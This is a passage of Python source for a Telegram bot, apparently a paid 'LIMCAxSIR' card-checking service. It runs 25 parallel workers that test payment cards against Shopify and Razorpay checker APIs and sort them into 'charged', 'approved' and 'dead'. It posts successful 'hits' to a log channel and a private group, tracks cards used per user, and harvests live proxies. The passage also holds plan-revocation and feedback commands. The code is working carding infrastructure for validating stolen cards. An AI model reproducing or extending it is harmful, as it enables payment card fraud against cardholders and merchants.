                        # Shopify standard payment/order notifications
                        'Order Confirmed', 'order confirmed',
                        'Thank you for your order', 'Thank you for your purchase',
                        'Order payment received', 'Payment received',
                        'Order placed successfully', 'Payment processed',
                        'Transaction approved', 'Payment approved',
                        'Order processing', 'Processing your order',
                        'Whats next', "Here's what's next",
                        # Confirmation webhook messages
                        'orders/paid', 'order_transactions/create',
                        'Payment completed', 'payment completed',
                        'Order fulfillment started', 'Preparing your order',
                        # Post-purchase messages
                        'Shipping confirmation coming soon', 'Track your order',
                        'Order number', 'Tracking information',
                        'Thank you for shopping with us', 'Appreciate your business'
                    ]
                    res['payment_messages'] = payment_messages
                    all_results['charged'].append(res)
                    await send_realtime_hit(chat_id, res, 'Charged', username)
                    await log_hit_to_channel(res, 'Charged', user_id, username, "Razorpay Mass Check")
                    await forward_to_private_group(res, user_id, username, "Razorpay Mass Check")
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(chat_id, res, 'Approved', username)
                    await log_hit_to_channel(res, 'Approved', user_id, username, "Razorpay Mass Check")
                else:
                    all_results['dead'].append(res)

                queue.task_done()

                now = time.time()
                if now - last_update_time[0] >= 5.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(chat_id, user_id, status_msg.id, all_results, all_results['checked'])
                        except Exception:
                            pass

        workers = [asyncio.create_task(rz_worker()) for _ in range(25)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)

        if session_key in active_sessions:
            await update_progress(chat_id, user_id, status_msg.id, all_results, all_results['checked'])

    except Exception as e:
        await bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]

        user_active_check.pop(user_id, None)  # fix #19: unconditional cleanup

        total_checked = len(all_results['charged']) + len(all_results['approved']) + len(all_results['dead'])

        increment_cc_used(user_id, total_checked)

        try:
            await status_msg.delete()
        except Exception:
            pass
        await send_final_results(chat_id, all_results)

# ====================== REVOKE PLAN (ADMIN ONLY) ======================
@bot.on(events.NewMessage(pattern=r"^/revoke (\d+)$"))
async def revoke_plan(event):
    if event.sender_id not in ADMIN_ID:
        return

    user_id = event.pattern_match.group(1)

    users = load_users_data()

    if user_id not in users:
        await event.reply("❌ User not found.")
        return

    old_plan = users[user_id].get("plan", "FREE")

    # Remove user plan
    del users[user_id]
    save_users_data(users)

    # User will automatically get FREE plan on next /start
    try:
        await bot.send_message(
            int(user_id),
            premium_emoji(
                "🚫 <b>Your Premium Plan Has Been Revoked</b>\n\n"
                "You are now on <b>FREE PLAN</b>.\n"
                "Contact admin if you think this is a mistake."
            ),
            parse_mode="html"
        )
    except:
        pass

    # Admin reply
    await event.reply(
        premium_emoji(
            f"✅ <b>Plan Revoked Successfully</b>\n\n"
            f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
            f"💎 <b>Old Plan:</b> {old_plan}\n"
            f"📦 <b>Current Plan:</b> FREE"
        ),
        parse_mode="html"
    )

    # Log Channel
    try:
        await bot.send_message(
            HIT_LOG_CHANNEL,
            premium_emoji(
                f"🚫 <b>PLAN REVOKED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👤 <b>User:</b> <code>{user_id}</code>\n"
                f"💎 <b>Old Plan:</b> {old_plan}\n"
                f"🛠 <b>Revoked By:</b> <code>{event.sender_id}</code>\n"
                f"⏳ <b>Time:</b> {datetime.now().strftime('%d %b %Y • %H:%M:%S')}\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📦 User moved to <b>FREE PLAN</b>"
            ),
            parse_mode="html"
        )
    except Exception as e:
        print("Revoke Log Error:", e)

# ====================== USER FEEDBACK SYSTEM ======================
@bot.on(events.NewMessage(pattern=r"^/fb$"))
async def feedback_command(event):
    if not event.is_reply:
        await event.reply("❌ Kisi bhi message ka reply karke /fb use karo.")
        return

    reply = await event.get_reply_message()
    sender = await event.get_sender()

    info = (
        "💬 <b>⚜ LIMCAJI FEEDBACK ⚜</b>\n"
        "━━━━━━━━━━━━━━━━━━\n\n"
        f"👤 <b>Name:</b> {sender.first_name}\n"
        f"🆔 <b>User ID:</b> <code>{sender.id}</code>\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    try:
        feedback_text = reply.text if reply.text else "No feedback text."
        
        if reply.media:
            await bot.send_file(
                FEEDBACK_GROUP,
                reply.media,
                caption=premium_emoji(
                    info +
                    f"\n\n💭 <b>User Feedback:</b>\n{feedback_text}"
                ),
                parse_mode="html"
            )
        else:
            await bot.send_message(
                FEEDBACK_GROUP,
                premium_emoji(
                    info + f"\n\n📝 <b>Feedback:</b>\n{reply.text}"
                ),
                parse_mode="html"
            )

        await event.reply("✅ Feedback sent successfully.")
    except Exception as e:
        await event.reply(f"❌ Error: {e}")

# ====================== STOP CALLBACK ======================
@bot.on(events.CallbackQuery(pattern=rb"stop_(\d+)"))
async def stop_handler(event):
    match = event.pattern_match
    user_id = int(match.group(1).decode())
    message_id = event.message_id
    session_key = f"{user_id}_{message_id}"
    rz_session_key = f"rz_{user_id}_{message_id}"
    found_key = session_key if session_key in active_sessions else (rz_session_key if rz_session_key in active_sessions else None)
    if found_key:
        del active_sessions[found_key]
        user_active_check.pop(user_id, None)  # fix #19: unconditional cleanup
        await event.answer("Stopped", alert=True)
        await safe_edit(event, premium_emoji("🛑 Checking stopped by user."), parse_mode='html')
    else:
        await event.answer("Already finished or not found.", alert=True)

# ====================== STOP PROXY CHECK ======================
@bot.on(events.CallbackQuery(data=b"stop_proxy_check"))
async def stop_proxy_check_callback(event):
    if current_proxy_check.get('tasks'):
        for t in current_proxy_check['tasks']:
            if not t.done():
                t.cancel()

        alive = current_proxy_check.get('alive_proxies', [])
        if alive:
            try:
                async with aiofiles.open(PROXY_FILE, 'a') as f:
                    for proxy in alive:
                        await f.write(f"{proxy}\n")
            except:
                pass

        await event.answer(f"⛔ Stopped! Saved {len(alive)} alive proxies.", alert=True)
    else:
        await event.answer("No active proxy check running.", alert=True)

# ====================== MAIN ======================
print("✅ LIMCAxSIR Bot started successfully!")
print(f"   Admins: {', '.join(str(uid) for uid in ADMIN_ID)}")
print(f"   Free Group: {GROUP_LINK}")
print(f"   Contact: LIMCAxSIR")
print("   ✅ Updated APIs:")
print(f"      Shopify: {CHECKER_API_URL}")
print(f"      Razorpay: {RAZORPAY_API_URL}")
bot.run_until_disconnected()
